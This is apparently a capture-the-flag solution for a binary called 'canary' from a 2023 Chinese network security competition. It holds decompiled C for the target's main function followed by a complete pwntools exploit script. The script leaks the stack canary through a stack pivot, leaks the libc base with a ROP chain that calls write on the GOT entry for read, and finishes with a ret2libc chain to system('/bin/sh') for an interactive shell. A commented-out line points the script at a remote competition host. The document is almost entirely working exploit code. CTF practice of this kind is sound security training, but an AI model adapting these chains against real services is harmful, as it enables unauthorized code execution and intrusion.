"""2023第三届网络安全攻防大赛个人赛①-线上赛 canary
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  int v5; // [rsp+Ch] [rbp-54h] BYREF
  char s[16]; // [rsp+10h] [rbp-50h] BYREF
  __int64 v7; // [rsp+20h] [rbp-40h]
  __int64 v8; // [rsp+28h] [rbp-38h]
  unsigned __int64 v9; // [rsp+58h] [rbp-8h]
  __int64 savedregs; // [rsp+60h] [rbp+0h] BYREF

  v9 = __readfsqword(0x28u);
  init(argc, argv, envp);
  strcpy(s, "This is canary!");
  v7 = 0LL;
  v8 = 0LL;
  v3 = strlen(s);
  write(1, s, v3);  //   lea     rax, [rbp-80]
  puts("Do you want to enter other functions?");
  v5 = 0;
  __isoc99_scanf("%d", &v5);
  if ( v5 == 1 )
    gift();
  else
    read(0, &savedregs, 0x10uLL);
  return 0;
}
"""
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
# o = remote('101.200.77.68', 27294)
o = process("./canary")
elf = ELF("./canary")
libc = elf.libc
# libc = ELF("./libc-2.31.so")
pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = ROP(elf).find_gadget(['pop rsi'])[0]
write_plt = elf.plt["write"]
read_got = elf.got['read']
gift = elf.sym['gift']


def get_canary():
    o.recv()
    o.sendline(b'2')
    payload = flat(0x404f00, 0x401296)  # 0x401296  mov     rax, fs:28h , 0x404f00 是用 vmmap 找的一个可写入地址
    o.send(payload)
    o.recvuntil(b'Do you want to enter other functions?\n')
    o.sendline(b'2')
    payload = flat(0x404f48, 0x4012EA)  # 004012EA lea     rax, [rbp+s]
    o.send(payload)
    canary = u64(o.recv(8))
    success('canary: ' + hex(canary))
    return canary


def get_libc():
    # o.recvuntil(b'Do you want to enter other functions?\n')
    o.sendline(b'1')
    payload = flat('a' * 56, canary, 0, pop_rdi, 1, pop_rsi, read_got, 0, write_plt, gift)
    o.sendline(payload)
    read_addr = u64(o.recvuntil(b'\x7f')[-6:] + b'\x00\x00')
    libc_base = read_addr - libc.sym['read']
    libc.address = libc_base
    success('libc_base: ' + hex(libc_base))


def get_shell():
    system_addr = libc.sym['system']
    bin_sh = next(libc.search(b"/bin/sh"))
    payload = flat('a' * 56, canary, 0, pop_rdi, bin_sh, system_addr, gift)
    o.sendline(payload)


if __name__ == '__main__':
    canary = get_canary()
    get_libc()
    get_shell()
    o.interactive()

